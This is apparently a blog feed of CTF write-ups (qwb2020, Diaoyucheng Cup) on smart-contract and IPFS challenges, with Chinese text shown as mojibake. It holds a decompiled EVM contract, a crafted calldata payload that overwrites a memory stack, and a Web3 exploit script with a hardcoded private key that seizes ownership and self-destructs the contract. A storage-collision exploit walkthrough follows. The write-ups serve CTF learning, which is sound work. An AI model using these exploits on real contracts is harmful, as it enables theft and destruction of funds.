Source16210000060405260043610610073576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680638d715d9d1461024557806360fe47b11461031a5780636d4ce63c1461035557806335f4699414610372578063b4a99a4e1461038157610073565b610078565b600080fd600060006000600060005b61012061010052565b6101005190565b60206101005101806101005252565b6101005151602061010051036101005290565b61010052565b6100ca610100516100975b565b565b6100d66100a6565b6100de6100a6565b6100e7906100b9565b565b6100f1610087565b565b34156100cc57610078565b6101086000610097565b5b7f01000000000000000000000000000000000000000000000000000000000000006101005151602061010051035101510415610152575b60016101005151016101005152610109565b61015a6100a6565b6101626100a6565b506100ce565b6101726000610097565b5b6020610100510351610100515103156101d9577f0100000000000000000000000000000000000000000000000000000000000000610100515160606101005103510151046101005151604061010051035101535b60016101005151016101005152610173565b60006101005151604061010051035101535b60406101005151061561021c5760006101005151604061010051035101535b600161010051510161010051526101eb565b6102246100a6565b5061022d6100a6565b506102366100a6565b5061023f6100a6565b506100ce565b61024d6100e9565b6102576000610097565b610100516102656212345650565b36602462013000376102756100bf565b61028061034f610097565b61028c62013000610097565b61029581610097565b6102a160243603610097565b610168565b6102ae6100bf565b6102b96102c7610097565b6102c281610097565b6100fe565b6020610100510381602060408303526020820352602060208203510660208203510360200160400160408203f35b602061010051035161010051515561030b6100a6565b506103146100a6565b506100ce565b6103226100f3565b61032a6100bf565b61033561034f610097565b610340600435610097565b61034a6000610097565b6102f5565b60006000f35b61035d6100f3565b60005433146100785760005460805260206080f35b60665433141561007857606654ff5b6066543314156100785733606655005b505050505050505050505050505050505050505050505050505050505050505050505050505050 Analyse ‰ΩøÁî® https://www.trustlook.com/services/smart.html ÂàÜÊûêÁöÑÁªìÊûúÂ¶Ç‰∏ã 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218contract disassembler &#123; function Backdoor() public return () &#123; var1 = func_00000087(); return(); &#125; function set() public return () &#123; // Please refer to main() for the functionality, Function Hash: 60FE47B1 &#125; function get() public return () &#123; require(!msg.value); return(); &#125; function die() public return () &#123; // Please refer to main() for the functionality, Function Hash: 35F46994 &#125; function Owner() public return () &#123; // Please refer to main() for the functionality, Function Hash: B4A99A4E &#125; function func_00000087() private return (var0) &#123; mstore(0x100,0x120); return(var1); &#125; function func_00000097( uint256 arg0) private return (var0) &#123; temp0 = mload(0x100); mstore(0x100,(temp0 + 0x20)); mstore((temp0 + 0x20),arg0); return(var0); &#125; function func_000000BF() private return (var0) &#123; var4 = mload(0x100); var2 = func_00000097(var4); return(var1); &#125; function func_000000A6() private return (var0) &#123; temp12 = mload(0x100); temp14 = mload(temp12); temp13 = mload(0x100); mstore(0x100,(temp13 - 0x20)); return(temp14); &#125; function func_000000B9( uint256 arg0) private return (var0) &#123; mstore(0x100,arg0); return(var2); &#125; function main() public return () &#123; mstore(0x40,0x100000); if ((msg.data.length &lt; 0x4)) &#123;label_00000073:label_00000078: revert(0x0,0x0); &#125; //ISSUE:COMMENT: Function Backdoor() else if ((0x8D715D9D == uint32((msg.data(0x0) / 0x100000000000000000000000000000000000000000000000000000000)))) &#123; Backdoor(); var0 = func_00000097(0x0); calldatacopy(0x13000,0x24,msg.data.length); var1 = func_000000BF(); var1 = func_00000097(0x34F); var1 = func_00000097(0x13000); var1 = func_00000097(var1); var1 = func_00000097((msg.data.length - 0x24)); var1 = func_00000097(0x0);label_00000173: temp2 = mload(0x100); temp5 = mload((temp2 - 0x20)); temp3 = mload(0x100); temp4 = mload(temp3); if ((temp4 - temp5)) &#123; temp22 = mload(0x100); temp25 = mload(temp22); temp23 = mload(0x100); temp24 = mload((temp23 - 0x60)); temp26 = mload((temp24 + temp25)); temp27 = mload(0x100); temp30 = mload(temp27); temp28 = mload(0x100); temp29 = mload((temp28 - 0x40)); mstore8((temp29 + temp30),(temp26 / 0x100000000000000000000000000000000000000000000000000000000000000)); temp31 = mload(0x100); temp32 = mload(temp31); temp33 = mload(0x100); mstore(temp33,(temp32 + 0x1)); goto label_00000173; &#125; else &#123; temp6 = mload(0x100); temp9 = mload(temp6); temp7 = mload(0x100); temp8 = mload((temp7 - 0x40)); mstore8((temp8 + temp9),0x0);label_000001EB: temp10 = mload(0x100); temp11 = mload(temp10); if (MOD(temp11,0x40)) &#123; temp15 = mload(0x100); temp18 = mload(temp15); temp16 = mload(0x100); temp17 = mload((temp16 - 0x40)); mstore8((temp17 + temp18),0x0); temp19 = mload(0x100); temp20 = mload(temp19); temp21 = mload(0x100); mstore(temp21,(temp20 + 0x1)); goto label_000001EB; &#125; else &#123; var2 = func_000000A6(); var2 = func_000000A6(); var2 = func_000000A6(); var2 = func_000000A6(); var2 = func_000000A6(); var3 = func_000000A6(); var3 = 0xE7; var2 = func_000000B9(var3); &#125; &#125; &#125; //ISSUE:COMMENT: Function set() else if ((0x60FE47B1 == var0)) &#123; get(); var0 = func_000000BF(); var0 = func_00000097(0x34F); var0 = func_00000097(msg.data(0x4)); var0 = func_00000097(0x0); temp34 = mload(0x100); temp37 = mload((temp34 - 0x20)); temp35 = mload(0x100); temp36 = mload(temp35); sstore(temp36,temp37); var1 = func_000000A6(); var1 = func_000000A6(); var1 = func_000000A6(); var2 = func_000000A6(); var2 = 0xE7; var1 = func_000000B9(var2); &#125; //ISSUE:COMMENT: Function get() else if ((0x6D4CE63C == var0)) &#123; get(); if ((msg.sender == sload(0x0))) &#123; goto label_00000078; &#125; else &#123; mstore(0x80,sload(0x0)); RETURN(0x80,0x20); &#125; &#125; //ISSUE:COMMENT: Function die() else if ((0x35F46994 == var0)) &#123; if ((msg.sender == sload(0x66))) &#123; //ISSUE:WARNING: SELFDESTRUCT is used to for the destruction selfdestruct(sload(0x66)); &#125; else &#123; goto label_00000078; &#125; &#125; //ISSUE:COMMENT: Function Owner() else if ((0xB4A99A4E == var0)) &#123; if ((msg.sender == sload(0x66))) &#123; sstore(0x66,msg.sender); stop(); &#125; else &#123; goto label_00000078; &#125; &#125; else &#123; goto label_00000073; &#125; &#125;&#125; Ê†πÊçÆ‰∏äÈù¢ÂèçÁºñËØëÁªìÊûúÂèäÂÖ∂ ida-evm ÂÖ∑‰ΩìÂàÜÊûê‰∏Ä‰∏ãÂèØ‰ª•ÂæóÂà∞‰∏ãÈù¢ÁöÑ‰º™‰ª£Á†Å 12345678910111213141516function get() public returns (address) &#123; require(msg.value == 0); require(msg.sender != sload(0x0)); return sload(0x0);&#125;function die() public &#123; require(msg.sender == sload(0x66)); selfdestruct(sload(0x66));&#125;function Owner() public &#123; require(msg.sender == sload(0x66)); sstore(0x66,msg.sender); stop();&#125; Ê†πÊçÆÂèçÁºñËØëÁªìÊûúÂèäÂÖ∂ ida-evm ÂÖ∑‰ΩìÂàÜÊûê set ÂáΩÊï∞Âíå Backdoor ÂáΩÊï∞ÔºåÂèØÂèëÁé∞ÂÖ∂Âà©Áî® mem ÂÆûÁé∞‰∫ÜÁ±ªÂ†ÜÊ†àÊìç‰ΩúÔºåÂèØÊÄªÁªìÂ¶Ç‰∏ãÔºö 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576function stack_push(uint256 value) private &#123; memory[0x100] = memory[0x100] + 0x20; memory[memory[0x100]+0x20] = value;&#125;function stack_get(uint256 depth) private &#123; return memory[memory[0x100] - depth*0x20];&#125;function stack_pop() private returns (uint256 value) &#123; value = memory[memory[0x100]]; memory[0x100] = memory[0x100] - 0x20;&#125;function stack_push_frame() private &#123; stack_push(memory[0x100]);&#125;function stack_pop_frame() private returns (uint256 dest) &#123; dest = stack_pop(); memory[0x100] = stack_pop();&#125;function set(uint256 value) public &#123; stack_push_frame(); stack_push(0x34f); stack_push(value); stack_push(0x00); set_ss();&#125;function set_ss() private &#123; sstore(stack_get(0x0),stack_get(1)); stack_pop(); stack_pop(); goto stack_pop_frame();&#125;function Backdoor() public &#123; memory[0x100] = 0x120; stack_push(0x00); var var1 = memory[0x100]; // 0x140 memcpy(memory[0x13000], msg.data[0x24], msg.data.length); stack_push_frame(); stack_push(irrelevant_lbl); stack_push(0x13000); stack_push(var1); stack_push(msg.data.length - 0x24); stack_push(0x00); copy_data(); memory[stack_get(2) + stack_get(0)] = 0x00; pad_data(); stack_pop(); stack_pop(); stack_pop(); stack_pop(); goto stack_pop_frame();&#125;function copy_data() private &#123; while (stack_get(0) - stack_get(1) != 0) &#123; memory[stack_get(2) + stack_get(0)] = memory[stack_get(3) + stack_get(0)] &gt;&gt; 248; memory[memory[0x100]] = memory[memory[0x100]] + 0x01; &#125;&#125;function pad_data() private &#123; while (stack_get(0) % 0x40 != 0) &#123; memory[stack_get(2) + stack_get(0)] = 0x00; memory[memory[0x100]] = memory[memory[0x100]] + 0x01; &#125;&#125; ÂÖ∂‰∏≠Êàë‰ª¨Ë¶Å‰Ωø set ÂØπÂ∫îÁöÑÂ†ÜÊ†àÂ¶Ç‰∏ã 123456789--------------------------------| stack frame set() |--------------------------------| address of &apos;return&apos; gadget | |-------------------------------- | stack grows down| our address | V--------------------------------| 0x66 |-------------------------------- Backdoor ÂØπÂ∫îÁöÑÂ†ÜÊ†àÂ¶Ç‰∏ã 123456789101112131415----------------------------------| 0x00 | &lt;---- this is 0x140----------------------------------| stack frame Backdoor() |----------------------------------| address of &apos;return&apos; gadget | |---------------------------------- | stack grows down| 0x13000 | V----------------------------------| 0x140 |----------------------------------| msg.data.length - 0x24 |----------------------------------| 0x00 |---------------------------------- ÂΩìË∞ÉÁî® Backdoor Êó∂ÔºåÂÆÉ‰ºöÂ∞Ü msg.data[0x24:] Â§çÂà∂Âà∞ÂÜÖÂ≠ò [0x140] ‰∏≠„ÄÇ ËøôÊÑèÂë≥ÁùÄÂ¶ÇÊûúÊàë‰ª¨ÁöÑÊ∂àÊÅØÈïø‰∫é 0x20 Â≠óËäÇÔºåÂÆÉÂ∞ÜÁ†¥ÂùèÂ†ÜÊ†àÔºåÁÑ∂ÂêéË¶ÜÁõñËøîÂõûÂú∞ÂùÄÔºå‰ª•Ê≠§Á±ªÊé®„ÄÇBackdoor ‰∏≠Â∞Ü payload Â§çÂà∂Âà∞ÂÜÖÂ≠ò [0x13000] ‰∏≠„ÄÇ Âõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•ÁÆÄÂçïÂú∞Êõ¥Êñ∞Â†ÜÊ†àÂ∏ßÊåáÈíàÔºåÂπ∂‰ΩøÂÖ∂ÊåáÂêëÊàë‰ª¨ÁöÑÂ†ÜÊ†àÊâÄÂú®ÁöÑ 0x13000 Â§Ñ Êàë‰ª¨ÈúÄË¶ÅÂØπ Backdoor ËøõË°åË∞ÉÁî®Ôºåmsg.data[0x24:] ÂêéÁöÑÊï∞ÊçÆÊØè 0x20 ÈïøÂ∫¶‰∏∫‰∏Ä‰∏™Âçï‰ΩçÔºåÂÖàÊòØ‰∏Ä‰∏™Âçï‰ΩçÁöÑ 0 Â°´ÂÖÖ 0x140 ‰ΩçÁΩÆÔºåÊé•ÁùÄ‰∏§‰∏™Âçï‰ΩçË¶ÜÁõñÂ†ÜÊ†àÂ∏ßÊåáÈíàÂíåËøîÂõûÂú∞ÂùÄ„ÄÇÊÄªÁöÑ msg.data ÈïøÂ∫¶‰∏∫ 0x164 Â≠óËäÇÔºåÊâÄ‰ª• msg.data[24:] ÈïøÂ∫¶‰∏∫ 0x140 Â≠óËäÇÔºåÊâÄ‰ª•ÂÅáÂ†ÜÊ†àÂ∏ßÊåáÈíàÊåáÂêë 0x13120 „ÄÇÊ†πÊçÆ set_ss ÊâÄÂú®ÁöÑ‰ΩçÁΩÆÔºå‰ΩøÁî® 0x2f5 ‰Ωú‰∏∫ËøîÂõû‰ΩçÁΩÆ„ÄÇÂõ†‰∏∫payload ÊòØ‰∏ÄÊ¨°‰∏Ä‰∏™Â≠óËäÇÂ§çÂà∂Âà∞ mem ‰∏≠ÔºåÊâÄ‰ª•Âú®Ë¶ÜÁõñÊé•‰∏ãÊù•ÁöÑÂõõ‰∏™Âçï‰ΩçÊó∂ÈúÄË¶ÅÊ≥®ÊÑèÔºöÂâç‰∏â‰∏™ÊòØÈùôÊÄÅÂÄºÔºåÁ¨¨Âõõ‰∏™ÊòØÂä®ÊÄÅÂÄºÔºàÈúÄË¶ÅÊ≥®ÊÑèÔºåÊ≠§Êó∂ÁöÑÁ¨¨‰∏â‰∏™Âçï‰ΩçË¶ÅÊåâÁÖß 0x40 ÈïøÂ∫¶ÂØπÈΩêÔºåÊâÄ‰ª•Á¨¨‰∏â‰∏™Âçï‰ΩçÊòØ0x140ÔºâÔºåÊ≠§Êó∂ payload Â¶Ç‰∏ãÊâÄÁ§∫Ôºö 123456789data = &apos;0x8d715d9d&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013120&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000002f5&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000000df&apos; ÊúÄÂêéÔºåÂèØ‰ª•ÊûÑÈÄ† set_ssÔºåÂπ∂‰ΩøÁî®ÂÖ∂ÂØπÂ†ÜÊ†àËøõË°åËØªÂèñÊìç‰Ωú„ÄÇÈ¶ñÂÖàÊåáÂÆö set_ss ÁöÑËøîÂõûÂú∞ÂùÄ‰∏∫0x34fËÉΩÂ§üÊ≠£Â∏∏ÁªìÊùüÔºõÁÑ∂ÂêéÔºåÊåáÂÆöË¶ÅÂÜôÂÖ•Â≠òÂÇ®ÁöÑÂÄºÔºõÊúÄÂêéÊåáÂÆöË¶ÅÂÜôÂÖ•ÁöÑÂ≠òÂÇ®ÊßΩ 0x66 123000000000000000000000000000000000000000000000000000000000000034f0000000000000000000000008F348B14089Bc472DE7bC954F3ABB7e169C000010000000000000000000000000000000000000000000000000000000000000066 ÊâÄ‰ª•ÔºåÊÄªÁöÑ payload Â¶Ç‰∏ãÊâÄÁ§∫Ôºö 123456789101112data = &apos;0x8d715d9d&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013120&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000002f5&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000000df&apos;data += &apos;000000000000000000000000000000000000000000000000000000000000034f&apos;data += &apos;0000000000000000000000008F348B14089Bc472DE7bC954F3ABB7e169C00001&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000066&apos; ÊúÄÂêéË∞ÉÁî® die Âç≥ÂèØ Exp1234567891011121314151617181920212223242526272829303132333435363738from web3 import Web3, HTTPProviderw3 = Web3(Web3.HTTPProvider("http://192.168.100.8:8888"))contract_address = "0xcbfa6049c0a04031ac0335afe323e3f993856e76"private = "3669a3b95e09cdb89777d777d63147bd7357fcce9219ce1f8e465b86b1135c59"public = "0x8F348B14089Bc472DE7bC954F3ABB7e169C00001"data = '0x8d715d9d'data += '0000000000000000000000000000000000000000000000000000000000000000'data += '0000000000000000000000000000000000000000000000000000000000000000'data += '0000000000000000000000000000000000000000000000000000000000013120'data += '00000000000000000000000000000000000000000000000000000000000002f5'data += '0000000000000000000000000000000000000000000000000000000000013000'data += '0000000000000000000000000000000000000000000000000000000000000140'data += '0000000000000000000000000000000000000000000000000000000000000140'data += '00000000000000000000000000000000000000000000000000000000000000df'data += '000000000000000000000000000000000000000000000000000000000000034f'data += '0000000000000000000000008F348B14089Bc472DE7bC954F3ABB7e169C00001'data += '0000000000000000000000000000000000000000000000000000000000000066'def hack(public, data): txn = &#123; 'from': Web3.toChecksumAddress(public), 'to': Web3.toChecksumAddress(contract_address), 'gasPrice': w3.eth.gasPrice, 'gas': 8000000, 'nonce': w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), 'data': data, &#125; signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print("txn_hash=", txn_hash) return txn_receiptprint(hack(public, data))print(hack(public, '0x35f46994'))]]></content>
      <categories>
        <category>qwb2020</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>qwb2020</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Á¨¨‰∏ÄÂ±äÈíìÈ±ºÂüéÊùØ strictmathematician WP]]></title>
    <url>%2F2020%2Fstrictmathematician%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Á¨¨‰∏ÄÂ±äÈíìÈ±ºÂüéÊùØÔºå2020Á∫ø‰∏äÊô∫Âçö‰ºö strictmathmatician ÁöÑ WP È¢òÁõÆÂæàÁÆÄÂçïÔºåËÄÉÂØüÁöÑÂÖ∂ÂÆûÊòØstorageÂ≠òÂÇ®Ôºå‰∏ªË¶ÅÊ∂âÂèäÂä®ÊÄÅÊï∞ÁªÑÂíåmapÁ±ªÂûãÊï∞ÊçÆ È¢òÁõÆÊ≤°ÁªôÁöÑÈÇ£ÈÉ®ÂàÜ‰ª£Á†ÅÂÖ∂ÂÆûÂè™ÊòØÂØπmap(address)ÂØπÂ∫îÁöÑÊï∞ÁªÑÈïøÂ∫¶ÁöÑÈôêÂà∂ÔºåÂ¶ÇÊûúÈ¢òÁõÆÂàÜÊûêÁöÑÊØîËæÉÈÄèÂΩªÔºåËøôÈÉ®ÂàÜÊòØ‰∏ç‰ºöÈÄ†ÊàêÂΩ±ÂìçÁöÑÔºåÂõ†‰∏∫ÊØîËµõÂè™Êúâ‰∏ÄÂ§©ÔºåÂêéÊù•Áõ¥Êé•Áªô‰∫ÜÂÆåÊï¥ÁöÑÊ∫êÁ†Å Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108pragma solidity ^0.4.23;contract StrictMathematician &#123; address owner; string private constant welcome = &quot;Oh, fantansitic baby! I am a strict mathematician&quot;; uint randomNumber = 0; uint createtime = now; constructor() public payable&#123; owner = msg.sender; &#125; struct Target &#123; function() internal callback; uint32 value; address origin; address sender; bytes12 hash; uint time; &#125; Target[] Targets; struct FailLog &#123; uint idx; address origin; uint time; bytes12 guessnum; address sender; &#125; mapping(address =&gt; FailLog[]) FailLogs; event SendFlag(address addr); function start(bytes12 hash) public payable &#123; Target target; target.origin = tx.origin; target.sender = msg.sender; target.hash = hash; require(msg.value == 1 ether); target.value += 1; Targets.push(target); &#125; function guess(uint idx, bytes12 num) public &#123; if (bytes12(keccak256(abi.encodePacked(num))) != Targets[idx].hash) &#123; FailLog faillog; faillog.idx = idx; faillog.time = now; faillog.origin = tx.origin; faillog.sender = msg.sender; faillog.guessnum = num; FailLogs[msg.sender].push(faillog); &#125; else &#123; Target target = Targets[idx]; target.value += 1; &#125; &#125; function check(uint idx, uint tmp) public &#123; uint maxlen = check_len(address(msg.sender)) + tmp * 3 / 4 ; require(uint(read_slot(uint(cal_mapaddr(uint(msg.sender),4)))) &lt;= maxlen); require(tmp != 0); Target target = Targets[idx+tmp]; require(uint32(target.value+1)==0); target.callback(); &#125; function payforflag() public payable &#123; require(address(this).balance == 0); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function read_slot(uint k) internal view returns (bytes32 res) &#123; assembly &#123; res := sload(k) &#125; &#125; function cal_mapaddr(uint k, uint p) internal pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(k, p)); &#125; function cal_arrayaddr(uint p) internal pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(p)); &#125; function check_len(address addr) internal pure returns(uint maxlen)&#123; uint res = uint(cal_arrayaddr(uint(cal_mapaddr(uint(addr),4)))); uint sum = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff; uint begin = uint(keccak256(abi.encodePacked(uint(3)))); uint distance; uint remainder; if (res&gt;begin) &#123; distance = res - begin; &#125; else&#123; distance = sum - begin + res + 1; &#125; remainder = distance % 3; if (remainder==0) &#123; maxlen = 1; &#125; else if (remainder==1) &#123; maxlen = 3; &#125; else &#123; maxlen = 2; &#125; &#125;&#125; Analyse Ë∞ÉÁî® start(0x000000000000000000000000) Ë∞ÉÁî® guess(0, 0xffffffff0000000000000153) ‰∏ÄÊ¨° ËÆ°ÁÆó target = kecaak256(keccak256(addr|4))+3 ËÆ°ÁÆó base = keccak256(3) distance = (2**256-base+target) % (2**256), idx = distance // 3 Ëã• distance % 3 = 0, Âàô idx = idx Ëã• distance % 3 = 1, Âàô idx += 4 ,Ë∞ÉÁî® guess(0, 0xffffffff0000000000000153) ‰∏§Ê¨° Ëã• distance % 3 = 2, Âàô idx += 2 ,ÊéâÁî® guess(0, 0xffffffff0000000000000153) ‰∏ÄÊ¨° Ë∞ÉÁî® guess(0, 0xffffffff0000000000000153) ‰∏âÊ¨° Ë∞ÉÁî® check(idx, 4) ÔºåÂÖ∂‰∏≠ tmp ‰∏∫ 4 ÁöÑÂÄçÊï∞ÔºåÂú®Ë∞ÉÁî® check ‰πãÂâçÈúÄË∞ÉÁî® guess(0, 0xffffffff0000000000000153) ÁöÑÊ¨°Êï∞‰∏∫ tmp*3/4]]></content>
      <categories>
        <category>ÈíìÈ±ºÂüéÊùØ</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>ÈíìÈ±ºÂüéÊùØ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb2020 Á¨¨ÂõõÂ±äÂº∫ÁΩëÊùØÁ∫ø‰∏äËµõÂå∫ÂùóÈìæ]]></title>
    <url>%2F2020%2Fqwb2020%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Á¨¨ÂõõÂ±ä qwbÔºåblockchains ÁöÑ WPÔºåÂãøÂñ∑ È¢òÁõÆËÄÉÊü•ÁöÑÁÇπÂ≠ê‰πü‰∏çÊòØÂæàÊñ∞ÔºåÂãøÂñ∑2333 ÈöèÊó∂Ê¨¢ËøéÂ§ßÂÆ∂Êù•‰∫§ÊµÅÔºåÂà´Âñ∑Â∞±Â•ΩÔºåË∞¢Ë∞¢ Ê≤°ÊúâÂÆòÊñπ WP ÔºåÊàëÂè™ÊòØËá™Â∑±ÂÜôÁùÄÁé© IPFS È¢òÁõÆËÄÉÊü•ÁöÑÊòØÊúÄËøëÂæàÁÅ´ÁöÑ IPFS Ôºå‰∏çËøáÂæàÁÆÄÂçïÔºåËÄÉÊü•ÁöÑÊòØ IPFS Â≠òÂÇ®ËßÑÂàôËÆ°ÁÆóÁöÑÁõ∏ÂÖ≥Áü•ËØÜÔºå‰∏çËøáÈ¢òÁõÆÂèØËÉΩÊèèËø∞ÁöÑ‰∏çÊ∏ÖÊ•öÔºåÂØºËá¥Êúâ‰∫õÈÄâÊâã‰∏çÊòéÁôΩ hash ÊòØ‰ªÄ‰πàÊÑèÊÄù2333ÔºåÂÜçÂä†‰∏äÊúÄÂêéÊâæÂà∞‰∏§Âº†ÂõæÁâáÔºåÂèØÊòØÊèê‰∫§ÁöÑ flag ‰∏çÂØπÔºåÂØºËá¥ÈÄâÊâã‰ª•‰∏∫ÊòØËÑëÊ¥ûÈ¢òÁõÆÔºåËá™Â∑±Âú®ÈÇ£Áåú hash Âà∞Â∫ïÊòØ‰ªÄ‰πàÔºåÂÖ∂ÂÆûÂπ∂‰∏çÊòØÔºåÊòØÂõ†‰∏∫ pic1 Ë¢´ÊåáÂÆöÂ§ßÂ∞èÂàÜÂùóÂ≠òÂÇ®‰∫ÜÔºåÊâÄ‰ª•‰Ω†Áõ¥Êé•ÊåâÁÖß‰∏Ä‰∏™ÂùóËÆ°ÁÆóÁöÑ cid ÁªìÊûú‰∏çÂØπÔºåÂú®Ê≠§ËØ¥Â£∞Êä±Ê≠âÔºåÂÖ∂ÂÆû hash Â∞±ÊòØÊñá‰ª∂ÁöÑ cidÔºåÂá∫È¢òÁöÑÊó∂ÂÄôÊ≤°ÊúâËÄÉËôëÂà∞Ëøô‰∏ÄÁÇπÔºåÊâÄ‰ª•È¢òÁõÆÁõÆÁöÑ‰∏çÊòØ‰∏∫‰∫ÜËÑëÊ¥ûÔºåÂú®Ê≠§Ëß£Èáä‰∏Ä‰∏ãÔºå‰∏çËøáÁúã‰∫ÜÁªùÂ§ßÂ§öÊï∞Èòü‰ºçÁöÑ WP ÂèëÁé∞‰ªñ‰ª¨ÁêÜËß£ÁöÑÊ≤°ÊúâÂÅèÂ∑ÆÔºåÊàë‰πü‰∏çÊòéÁôΩ‰∏∫‰ªÄ‰πà ÈúÄË¶Å‰∫ÜËß£‰∏Ä‰∏ã IPFS ÊòØÂ¶Ç‰ΩïËÆ°ÁÆóÊñá‰ª∂ hash ÁöÑÔºåÂç≥ cidÔºåÁÆÄÂåñÊÄªÁªì‰∏∫ÔºöÂéüÂßãÊï∞ÊçÆÊ∑ªÂä†ÂÖÉÊï∞ÊçÆÂ∞ÅË£ÖÊàê IPFS Êñá‰ª∂ -&gt; ËÆ°ÁÆó SHA2-256 -&gt; Â∞ÅË£ÖÊàê multihash -&gt; ËΩ¨Êç¢Êàê Base58 ÊâÄ‰ª•ÂØπ‰∫é pic2.jpg ÔºåÊàë‰ª¨ËÆ°ÁÆóÂÆÉÁöÑ multihash ÁÑ∂ÂêéËΩ¨ Base58 Âç≥ÂèØÔºåÂèØ‰ΩøÁî®Â¶Ç‰∏ãËÑöÊú¨ËÆ°ÁÆó 12import base58print base58.b58encode_int(int("1220659c2a2c3ed5e50f848135eea4d3ead3fa2607e2102ae73fafe8f82378ce1d1e", 16)) ËÆ°ÁÆóÁªìÊûú‰∏∫ QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 ÔºåÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•ËÆøÈóÆ https://ipfs.io/ipfs/QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 Âç≥ÂèØ ÂØπ‰∫é pic1.jpg ÔºåËÄÉÊü•ÁöÑÊòØ IPFS Êñá‰ª∂ÁöÑÁ¢éÁâáÂåñÂ≠òÂÇ®ÔºåIPFS ÈªòËÆ§ËßÑÂàôÊòØÊñá‰ª∂ÊâÄÂç†Á©∫Èó¥Â§ß‰∫é 256kb Â∞±‰ºöË¢´ÂàáÂàÜÊàêÂ∞èÂùóÔºåÊØè‰∏ÄÂùóÂ∞è‰∫éÊàñÁ≠â‰∫é 256kb „ÄÇ‰∏çËøáÊàë‰ª¨‰∏ä‰º†Êó∂ÂèØ‰ª•ÊåáÂÆöÁ¢éÁâáÂåñÁöÑÂ§ßÂ∞èÔºå‰ΩøÁî® -s size-? ÂèÇÊï∞Âç≥ÂèØÔºåÈ¢òÁõÆÊòØÊää pic1.jpg Á¢éÁâáÂåñÊàê‰∫Ü 6 ‰∏™ block ÔºåÂàÜÂà´ÁªôÂá∫‰∫ÜÂÆÉ‰ª¨ÁöÑÊñá‰ª∂ hash ÂÄºÔºåÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄË¶ÅÂ∞ÜÂÖ∂ÊãºÊàê‰∏ÄÂº†ÂõæÁâáÂç≥ÂèØÔºåÊéíÂàóÁªÑÂêàÂç≥ÂèØ(ÂèØ‰ª•ÂÖàÊâæÂà∞Êñá‰ª∂Â§¥ÊâÄÂú®ÁöÑ block ÂíåÊñá‰ª∂Â∞æÊâÄÂú®ÁöÑ block ÔºåÂØπÂâ©‰Ωô 4 ‰∏™ block ÊéíÂàóÁªÑÂêà) ÊéíÂàóÁªÑÂêàÁöÑËÑöÊú¨Â¶Ç‰∏ãÔºå3.jpg ‰æøÊòØ pic1.jpg 1234567891011121314import osimport itertoolsl = ["QmZkF524d8HWfF8k2yLrZwFz9PtaYgCwy3UqJP5Ahk5aXH", "Qme7fkoP2scbqRPaVv6JEiaMjcPZ58NYMnUxKAvb2paey2", "QmU59LjvcC1ueMdLVFve8je6vBY48vkEYDQZFiAbpgX9mf", "QmfUbHZQ95XKu9vd5XCerhKPsogRdYHkwx8mVFh5pwfNzE"]index = 1for i in itertools.permutations('0123', 4): os.system("ipfs cat QmXh6p3DGKfvEVwdvtbiH7SPsmLDfL7LXrowAZtQjkjw73 &gt;&gt; ./ipfs/&#123;&#125;.jpg".format(index)) for j in i: print j os.system("ipfs cat " + l[int(j)] + " &gt;&gt; ./ipfs/&#123;&#125;.jpg".format(index)) os.system("ipfs cat QmXFSNiJ8BdbUKPAsu3oueziyYqeYhi3iyQPXgVSvqTBtN &gt;&gt; ./ipfs/&#123;&#125;.jpg".format(index)) print(index) index = index + 1 ÂæóÂà∞‰ø°ÊÅØ flag=flag{md5(hash1+hash2)} ÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÊâæÂà∞ hash1 ÔºåÂæàÁÆÄÂçïÔºåÂè™ÈúÄË¶ÅÊàë‰ª¨ÈáçÊñ∞‰∏ä‰º†‰∏Ä‰∏ã pic1.jpg Âç≥ÂèØÔºåsize ÁöÑÂ§ßÂ∞èÂèØ‰ª•Ê†πÊçÆÂàÜÂùó block 